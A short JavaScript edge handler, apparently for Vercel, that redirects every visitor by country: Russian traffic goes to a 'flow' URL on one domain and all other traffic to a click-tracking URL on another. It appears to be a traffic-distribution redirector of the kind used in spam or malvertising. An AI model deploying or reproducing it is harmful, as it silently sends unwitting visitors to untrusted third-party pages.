export const config = {
  runtime: 'edge',
};

export default async function handler(req) {
  const country = req.headers.get("x-vercel-ip-country") || "XX";

  if (country === "RU") {
    return Response.redirect("https://smarts-tg.com/client.php?flow=254249-272409-1", 302);
  }

  return Response.redirect("https://jgmila.top/click?o=2&a=1551", 302);
}
